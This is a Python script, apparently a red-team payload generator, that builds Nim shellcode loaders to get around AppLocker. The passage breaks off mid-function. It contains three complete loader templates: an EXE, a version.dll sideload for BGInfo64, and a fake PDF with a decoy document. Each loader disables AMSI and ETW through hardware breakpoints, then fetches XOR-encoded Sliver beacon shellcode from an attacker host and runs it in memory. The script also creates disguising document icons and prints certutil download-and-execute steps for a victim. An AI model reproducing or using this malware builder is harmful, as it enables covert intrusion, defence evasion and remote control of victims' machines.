#!/usr/bin/env python3
"""
orsumaal.py — Automated Payload Generator for AppLocker Bypass Module

Generates Nim-based shellcode loaders for three attack methods:
  1. Standalone EXE (direct execution from trusted path)
  2. DLL Sideload (version.dll proxy for BGInfo64.exe)
  3. Fake PDF (GUI EXE with PDF icon, opens real decoy PDF)

Prerequisite: /tmp/beacon.bin must exist (generate via Sliver first).

Developed by Vamsi Krishna Orsu
"""

import os
import re
import sys
import shutil
import subprocess

# ═══════════════════════════════════════════════════════════════
# ANSI COLORS
# ═══════════════════════════════════════════════════════════════
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    BG_RED  = "\033[41m"

def ok(msg):    print(f"  {C.GREEN}[+]{C.RESET} {msg}")
def info(msg):  print(f"  {C.CYAN}[*]{C.RESET} {msg}")
def warn(msg):  print(f"  {C.YELLOW}[!]{C.RESET} {msg}")
def fail(msg):  print(f"  {C.RED}[x]{C.RESET} {msg}")
def step(msg):  print(f"\n  {C.MAGENTA}{C.BOLD}>>>{C.RESET} {C.BOLD}{msg}{C.RESET}")

def section(title):
    w = 60
    print(f"\n  {C.DIM}{'─' * w}{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}{title}{C.RESET}")
    print(f"  {C.DIM}{'─' * w}{C.RESET}")

# ═══════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════
BANNER = rf"""
{C.RED}{C.BOLD}
     ██████  ██████  ███████ ██    ██ ███    ███  █████   █████  ██      
    ██    ██ ██   ██ ██      ██    ██ ████  ████ ██   ██ ██   ██ ██      
    ██    ██ ██████  ███████ ██    ██ ██ ████ ██ ███████ ███████ ██      
    ██    ██ ██   ██      ██ ██    ██ ██  ██  ██ ██   ██ ██   ██ ██      
     ██████  ██   ██ ███████  ██████  ██      ██ ██   ██ ██   ██ ███████ 
{C.RESET}
{C.DIM}    ┌────────────────────────────────────────────────────────────┐
    │  {C.RESET}{C.WHITE}{C.BOLD}Payload Generator for AppLocker Bypass{C.RESET}{C.DIM}                      │
    │  {C.RESET}{C.CYAN}Nim Shellcode Loaders  |  HWBP AMSI/ETW Bypass{C.RESET}{C.DIM}            │
    │  {C.RESET}{C.YELLOW}Developed by Vamsi Krishna Orsu{C.RESET}{C.DIM}                          │
    └────────────────────────────────────────────────────────────┘{C.RESET}
"""

# ═══════════════════════════════════════════════════════════════
# DEFAULTS
# ═══════════════════════════════════════════════════════════════
DEFAULT_IP      = "192.168.10.10"
DEFAULT_PORT    = "8888"
DEFAULT_XOR_KEY = 0xAB
BEACON_PATH     = "/tmp/beacon.bin"
OUTPUT_DIR      = "/tmp"

# Icon presets: (label, bg_color_hex, text, text_color_hex)
# Index 0 = PDF, 1 = MSI/Installer, 2 = Word, 3 = Excel, 4 = PowerPoint, 5 = None
ICON_PRESETS = [
    ("PDF Document",          "#CC0000", "PDF",   "white"),
    ("Windows Installer/MSI", "#0078D4", "MSI",   "white"),
    ("Word Document",         "#1E5FA8", "W",     "white"),
    ("Excel Spreadsheet",     "#1D6F42", "XLS",   "white"),
    ("PowerPoint",            "#C43E1C", "PPT",   "white"),
    ("No icon",               None,      None,    None),
]

# Default recommended icon index per attack type (1-indexed for display)
# 1=EXE -> MSI (idx 1), 2=DLL -> MSI (idx 1), 3=PDF -> PDF (idx 0)
DEFAULT_ICON_PER_ATTACK = {1: 1, 2: 1, 3: 0}

# ═══════════════════════════════════════════════════════════════
# FILENAME VALIDATION
# ═══════════════════════════════════════════════════════════════
VALID_NAME_RE = re.compile(r'^[a-zA-Z0-9_\-]+$')

def validate_filename(name):
    """
    Returns (clean_name, error_msg).
    clean_name is None if invalid.
    Allowed: letters, digits, hyphens, underscores. No spaces, no dots.
    """
    if not name:
        return None, "Name cannot be empty."
    if ' ' in name:
        return None, "Name cannot contain spaces. Use hyphens or underscores."
    if not VALID_NAME_RE.match(name):
        bad = set(c for c in name if not re.match(r'[a-zA-Z0-9_\-]', c))
        return None, f"Invalid characters: {' '.join(repr(c) for c in bad)}. Use only letters, digits, hyphens (-), underscores (_)."
    return name, None

def ask_filename(prompt, default, extension):
    """
    Ask for a base filename (no extension). Validates and loops until clean.
    Returns the full filename with extension appended.
    """
    print(f"\n  {C.DIM}  Allowed: letters, digits, hyphens (-), underscores (_). No spaces.{C.RESET}")
    while True:
        raw = ask(prompt, default)
        # Strip extension if user accidentally typed it
        raw = raw.rstrip(extension).rstrip(".")
        name, err = validate_filename(raw)
        if err:
            warn(f"Invalid filename: {err}")
            warn(f"Example: {C.DIM}{default}{C.RESET}")
        else:
            full = f"{name}{extension}"
            ok(f"Output filename: {C.WHITE}{full}{C.RESET}")
            return full

# ═══════════════════════════════════════════════════════════════
# PREFLIGHT CHECKS
# ═══════════════════════════════════════════════════════════════

def cmd_exists(cmd):
    return shutil.which(cmd) is not None

def preflight(need_icon=False):
    """Run all preflight checks. Returns True if all pass."""
    section("Preflight Checks")
    passed = True

    if os.path.isfile(BEACON_PATH):
        size_mb = os.path.getsize(BEACON_PATH) / (1024 * 1024)
        ok(f"{BEACON_PATH} found ({size_mb:.1f} MB)")
    else:
        fail(f"{BEACON_PATH} not found")
        print(f"      {C.DIM}Generate it in Sliver first:{C.RESET}")
        print(f"      {C.WHITE}sliver > generate beacon --http https://<KALI_IP>:443 \\{C.RESET}")
        print(f"      {C.WHITE}  --os windows --arch amd64 --format shellcode \\{C.RESET}")
        print(f"      {C.WHITE}  --shellcode-encoder none --skip-symbols \\{C.RESET}")
        print(f"      {C.WHITE}  --seconds 30 --jitter 10 --save /tmp/beacon.bin{C.RESET}")
        passed = False

    if cmd_exists("nim"):
        ok("nim compiler found")
    else:
        fail("nim compiler not found")
        print(f"      {C.DIM}Install: curl https://nim-lang.org/choosenim/init.sh -sSf | sh{C.RESET}")
        passed = False

    if cmd_exists("x86_64-w64-mingw32-gcc"):
        ok("x86_64-w64-mingw32-gcc (MinGW) found")
    else:
        fail("MinGW cross-compiler not found")
        print(f"      {C.DIM}Install: sudo apt install gcc-mingw-w64-x86-64{C.RESET}")
        passed = False

    if need_icon:
        if cmd_exists("convert"):
            ok("ImageMagick (convert) found")
        else:
            fail("ImageMagick not found (needed for icon generation)")
            print(f"      {C.DIM}Install: sudo apt install imagemagick{C.RESET}")
            passed = False

        if cmd_exists("x86_64-w64-mingw32-windres"):
            ok("x86_64-w64-mingw32-windres found")
        else:
            fail("windres not found (needed for icon resource)")
            print(f"      {C.DIM}Install: sudo apt install binutils-mingw-w64-x86-64{C.RESET}")
            passed = False

    return passed

# ═══════════════════════════════════════════════════════════════
# XOR ENCODER
# ═══════════════════════════════════════════════════════════════

def xor_encode(xor_key):
    step("XOR-encoding shellcode")
    with open(BEACON_PATH, "rb") as f:
        data = f.read()
    encoded = bytes([b ^ xor_key for b in data])
    out_path = os.path.join(OUTPUT_DIR, "beacon_encoded.bin")
    with open(out_path, "wb") as f:
        f.write(encoded)
    ok(f"Encoded {len(data):,} bytes  key=0x{xor_key:02X}  →  {out_path}")
    return out_path

# ═══════════════════════════════════════════════════════════════
# NIM TEMPLATES
# ═══════════════════════════════════════════════════════════════

def nim_exe_loader(ip, port, xor_key_hex):
    return f'''import winim/lean
import winim/winstr
import winim/utils
import os
import httpclient
import strutils

const KALI_IP    = "{ip}"
const KALI_PORT  = "{port}"
const SC_PATH    = "/beacon_encoded.bin"
const XOR_KEY    = 0x{xor_key_hex}.byte

var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {{.stdcall.}} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return
  if encoded.len == 0:
    return
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY
  let scLen = shellcode.len.SIZE_T
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return
  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)
  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)
  discard EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](mem), LCID_INSTALLED)

when isMainModule:
  setHardwareBreakpoints()
  runShellcode()
'''


def nim_dll_loader(ip, port, xor_key_hex):
    return f'''import winim/lean
import winim/winstr
import os
import httpclient

const KALI_IP   = "{ip}"
const KALI_PORT = "{port}"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0x{xor_key_hex}.byte

var realVersionDll: HMODULE = 0

proc GetFileVersionInfoA*(lptstrFilename: LPCSTR, dwHandle: DWORD, dwLen: DWORD, lpData: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoA"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoW*(lptstrFilename: LPCWSTR, dwHandle: DWORD, dwLen: DWORD, lpData: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoW"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoSizeA*(lptstrFilename: LPCSTR, lpdwHandle: LPDWORD): DWORD {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: LPDWORD): DWORD {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeA"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc GetFileVersionInfoSizeW*(lptstrFilename: LPCWSTR, lpdwHandle: LPDWORD): DWORD {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: LPDWORD): DWORD {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeW"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc VerQueryValueA*(pBlock: LPCVOID, lpSubBlock: LPCSTR, lplpBuffer: ptr LPVOID, puLen: ptr UINT): BOOL {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCSTR, c: ptr LPVOID, d: ptr UINT): BOOL {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueA"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerQueryValueW*(pBlock: LPCVOID, lpSubBlock: LPCWSTR, lplpBuffer: ptr LPVOID, puLen: ptr UINT): BOOL {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCWSTR, c: ptr LPVOID, d: ptr UINT): BOOL {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueW"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerLanguageNameA*(wLang: DWORD, szLang: LPSTR, nSize: DWORD): DWORD {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPSTR, c: DWORD): DWORD {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameA"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

proc VerLanguageNameW*(wLang: DWORD, szLang: LPWSTR, nSize: DWORD): DWORD {{.stdcall, exportc, dynlib.}} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPWSTR, c: DWORD): DWORD {{.stdcall.}}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameW"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {{.stdcall.}} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

proc shellcodeThread(param: LPVOID): DWORD {{.stdcall.}} =
  sleep(500)
  setHardwareBreakpoints()
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return 0
  if encoded.len == 0:
    return 0
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY
  let scLen = shellcode.len.SIZE_T
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return 0
  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)
  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)
  discard EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](mem), LCID_INSTALLED)
  return 0

proc DllMain*(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {{.stdcall, exportc, dynlib.}} =
  case fdwReason
  of DLL_PROCESS_ATTACH:
    realVersionDll = LoadLibraryA("version_real.dll")
    var threadId: DWORD = 0
    discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](shellcodeThread), nil, 0, addr threadId)
  of DLL_PROCESS_DETACH:
    if realVersionDll != 0:
      discard FreeLibrary(realVersionDll)
  else:
    discard
  return TRUE
'''


def nim_pdf_loader(ip, port, xor_key_hex, decoy_filename, dropped_pdf_name):
    return f'''import winim/lean
import winim/shell
import winim/winstr
import os
import httpclient
import strutils

const KALI_IP   = "{ip}"
const KALI_PORT = "{port}"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0x{xor_key_hex}.byte
const DECOY_URL = "http://" & KALI_IP & ":" & KALI_PORT & "/{decoy_filename}"

var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {{.stdcall.}} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

proc openDecoyPdf() =
  let tempDir = getEnv("TEMP")
  let pdfPath = tempDir & "\\\\{dropped_pdf_name}"
  var client = newHttpClient()
  try:
    let pdfData = client.getContent(DECOY_URL)
    writeFile(pdfPath, pdfData)
  except:
    return
  discard ShellExecuteA(0, "open", pdfPath, nil, nil, SW_SHOWNORMAL)

proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return
  if encoded.len == 0:
    return
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY
  let scLen = shellcode.len.SIZE_T
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return
  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)
  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)
  discard EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](mem), LCID_INSTALLED)

when isMainModule:
  openDecoyPdf()
  sleep(1000)
  setHardwareBreakpoints()
  runShellcode()
'''

# ═══════════════════════════════════════════════════════════════
# ICON GENERATION
# ═══════════════════════════════════════════════════════════════

def ask_icon_preset(attack_type):
    """
    Show icon preset menu with a recommended default per attack type.
    Returns the chosen index (0-based), or None for no icon.
    """
    recommended_idx = DEFAULT_ICON_PER_ATTACK.get(attack_type, 0)
    rec_label = ICON_PRESETS[recommended_idx][0]

    print(f"\n  {C.CYAN}?{C.RESET} Choose an icon to embed in the binary")
    print(f"  {C.DIM}  Recommended for this attack: {C.RESET}{C.YELLOW}{rec_label}{C.RESET}\n")

    for i, (label, bg, text, _) in enumerate(ICON_PRESETS, 1):
        if bg:
            color_preview = f"{C.BOLD}[{text}]{C.RESET}"
        else:
            color_preview = f"{C.DIM}(none){C.RESET}"
        tag = f" {C.YELLOW}← recommended{C.RESET}" if (i - 1) == recommended_idx else ""
        print(f"     {C.BOLD}{i}{C.RESET}. {label:<28} {color_preview}{tag}")
    print()

    while True:
        val = input(
            f"  {C.CYAN}>{C.RESET} Choose [1-{len(ICON_PRESETS)}] "
            f"[{C.DIM}Enter = {recommended_idx + 1}{C.RESET}]: "
        ).strip()
        if val == "":
            idx = recommended_idx
        elif val.isdigit() and 1 <= int(val) <= len(ICON_PRESETS):
            idx = int(val) - 1
        else:
            fail(f"Enter a number between 1 and {len(ICON_PRESETS)}")
            continue
        label, bg, text, _ = ICON_PRESETS[idx]
        if bg is None:
            info("No icon will be embedded.")
            return None
        ok(f"Icon selected: {label}")
        return idx


def generate_icon(preset_idx):
    """
    Generate an icon from a preset using ImageMagick and compile to .res.
    Returns the path to the .res file, or None on failure.
    """
    label, bg_color, text, text_color = ICON_PRESETS[preset_idx]
    step(f"Generating icon: {label}")

    png_path = os.path.join(OUTPUT_DIR, "payload_icon_256.png")
    ico_path = os.path.join(OUTPUT_DIR, "payload_icon.ico")
    rc_path  = os.path.join(OUTPUT_DIR, "payload_icon.rc")
    res_path = os.path.join(OUTPUT_DIR, "payload_icon.res")

    # Build PNG with ImageMagick
    fontsize = 56 if len(text) >= 4 else 72
    cmd_png = (
        f'convert -size 256x256 xc:"{bg_color}" '
        f'-fill {text_color} -font DejaVu-Sans-Bold -pointsize {fontsize} '
        f'-gravity center -annotate 0 "{text}" '
        f'"{png_path}"'
    )
    info("Creating icon image with ImageMagick...")
    r = subprocess.run(cmd_png, shell=True, capture_output=True, text=True)
    if r.returncode != 0:
        fail(f"ImageMagick PNG failed: {r.stderr.strip()}")
        return None

    # Convert PNG → ICO (multiple sizes)
    cmd_ico = (
        f'convert "{png_path}" '
        f'-define icon:auto-resize=256,128,64,48,32,16 '
        f'"{ico_path}"'
    )
    r = subprocess.run(cmd_ico, shell=True, capture_output=True, text=True)
    if r.returncode != 0:
        fail(f"ICO conversion failed: {r.stderr.strip()}")
        return None

    # Verify ICO
    file_r = subprocess.run(["file", ico_path], capture_output=True, text=True)
    if "icon" not in file_r.stdout.lower():
        fail(f"Generated file is not a valid ICO: {file_r.stdout.strip()}")
        return None
    ok(f"Icon created: {ico_path}")

    # Write .rc
    with open(rc_path, "w") as f:
        f.write('1 ICON "payload_icon.ico"\n')

    # Compile .res
    info("Compiling icon resource file...")
    r = subprocess.run(
        ["x86_64-w64-mingw32-windres", rc_path, "-O", "coff", "-o", res_path],
        capture_output=True, text=True,
        cwd=OUTPUT_DIR
    )
    if r.returncode != 0:
        fail(f"windres failed: {r.stderr.strip()}")
        return None

    ok(f"Resource compiled: {res_path}")
    return res_path

# ═══════════════════════════════════════════════════════════════
# DECOY PDF SETUP
# ═══════════════════════════════════════════════════════════════

def setup_decoy_pdf(pdf_src_path, decoy_dest_name):
    """Copy user's PDF to /tmp/<decoy_dest_name>."""
    step("Setting up decoy PDF")
    pdf_src_path = os.path.expanduser(pdf_src_path)

    if not os.path.isfile(pdf_src_path):
        fail(f"File not found: {pdf_src_path}")
        return False

    file_r = subprocess.run(["file", pdf_src_path], capture_output=True, text=True)
    if "pdf" not in file_r.stdout.lower():
        warn(f"File may not be a PDF: {file_r.stdout.strip()}")
        warn("Continuing anyway — the loader will serve it regardless")

    dest = os.path.join(OUTPUT_DIR, decoy_dest_name)
    shutil.copy2(pdf_src_path, dest)
    size_kb = os.path.getsize(dest) / 1024
    ok(f"Decoy PDF → {dest} ({size_kb:.0f} KB)")
    return True

# ═══════════════════════════════════════════════════════════════
# COMPILATION
# ═══════════════════════════════════════════════════════════════

def compile_nim(nim_file, output_file, app_type="console", extra_flags=None):
    step(f"Compiling → {os.path.basename(output_file)}")
    cmd = [
        "nim", "c",
        "-d:mingw",
        "-d:release",
        "--opt:size",
        f"--app:{app_type}",
        "--passL:-s",
        "--cpu:amd64",
    ]
    if app_type == "lib":
        cmd.append("--nomain")
    if extra_flags:
        cmd.extend(extra_flags)
    cmd.extend([f"-o:{output_file}", nim_file])

    info(f"Running: {' '.join(cmd)}")
    print()
    result = subprocess.run(cmd, capture_output=False)

    if result.returncode != 0:
        fail("Compilation failed. See errors above.")
        return False

    if os.path.isfile(output_file):
        size_kb = os.path.getsize(output_file) / 1024
        ok(f"Output: {output_file} ({size_kb:.0f} KB)")
        file_result = subprocess.run(["file", output_file], capture_output=True, text=True)
        if file_result.returncode == 0:
            info(file_result.stdout.strip())
        return True
    else:
        fail(f"Output file not created: {output_file}")
        return False

# ═══════════════════════════════════════════════════════════════
# NEXT STEPS
# ═══════════════════════════════════════════════════════════════

def print_next_steps(attack_type, ip, port, output_filename, files_generated):
    section("Next Steps")

    print(f"""
  {C.BOLD}1. Start HTTP server{C.RESET} (new terminal on Kali):

     {C.GREEN}cd /tmp && python3 -m http.server {port}{C.RESET}
""")

    print(f"""  {C.BOLD}2. Ensure Sliver listener is up:{C.RESET}

     {C.GREEN}sliver > https --lhost {ip} --lport 443{C.RESET}
     {C.GREEN}sliver > jobs{C.RESET}
""")

    if attack_type == 1:
        print(f"""  {C.BOLD}3. On victim{C.RESET} (CORP\\vamsi):

     {C.GREEN}certutil.exe -urlcache -split -f http://{ip}:{port}/{output_filename} C:\\Windows\\Temp\\{output_filename}{C.RESET}
     {C.GREEN}C:\\Windows\\Temp\\{output_filename}{C.RESET}
""")

    elif attack_type == 2:
        print(f"""  {C.BOLD}3. On victim{C.RESET} (CORP\\vamsi):

     {C.DIM}# Setup BGInfo:{C.RESET}
     {C.GREEN}Invoke-WebRequest -Uri "https://download.sysinternals.com/files/BGInfo.zip" -OutFile "$env:TEMP\\BGInfo.zip"{C.RESET}
     {C.GREEN}Expand-Archive -Path "$env:TEMP\\BGInfo.zip" -DestinationPath "C:\\Windows\\Temp\\bginfo\\"{C.RESET}

     {C.DIM}# Download your DLL (note: must be named version.dll):{C.RESET}
     {C.GREEN}certutil.exe -urlcache -split -f http://{ip}:{port}/{output_filename} C:\\Windows\\Temp\\bginfo\\{output_filename}{C.RESET}

     {C.DIM}# Copy real version.dll and rename:{C.RESET}
     {C.GREEN}copy C:\\Windows\\System32\\version.dll C:\\Windows\\Temp\\bginfo\\version_real.dll{C.RESET}

     {C.DIM}# Run BGInfo — it loads your DLL automatically:{C.RESET}
     {C.GREEN}C:\\Windows\\Temp\\bginfo\\Bginfo64.exe /timer:0 /nolicprompt{C.RESET}
""")

    elif attack_type == 3:
        print(f"""  {C.BOLD}3. On victim{C.RESET} (CORP\\vamsi):

     {C.GREEN}certutil.exe -urlcache -split -f "http://{ip}:{port}/{output_filename}" "C:\\Windows\\Temp\\{output_filename}"{C.RESET}
     {C.GREEN}C:\\Windows\\Temp\\{output_filename}{C.RESET}

     {C.DIM}Decoy PDF opens. Beacon fires in background.{C.RESET}
""")

    print(f"""  {C.BOLD}4. Watch Sliver for the beacon:{C.RESET}

     {C.GREEN}sliver > beacons{C.RESET}

     {C.DIM}Beacon appears within 30-40 seconds.{C.RESET}
""")

    section("Generated Files")
    for f in files_generated:
        if os.path.isfile(f):
            size_kb = os.path.getsize(f) / 1024
            print(f"  {C.GREEN}●{C.RESET} {f} ({size_kb:.0f} KB)")
        else:
            print(f"  {C.RED}●{C.RESET} {f}  {C.DIM}(missing){C.RESET}")
    print()

# ═══════════════════════════════════════════════════════════════
# USER INPUT HELPERS
# ═══════════════════════════════════════════════════════════════

def ask(prompt, default=""):
    if default:
        val = input(f"  {C.CYAN}?{C.RESET} {prompt} [{C.DIM}{default}{C.RESET}]: ").strip()
        return val if val else default
    else:
        val = input(f"  {C.CYAN}?{C.RESET} {prompt}: ").strip()
        return val

def ask_choice(prompt, options):
    print(f"\n  {C.CYAN}?{C.RESET} {prompt}\n")
    for i, opt in enumerate(options, 1):
        print(f"     {C.BOLD}{i}{C.RESET}. {opt}")
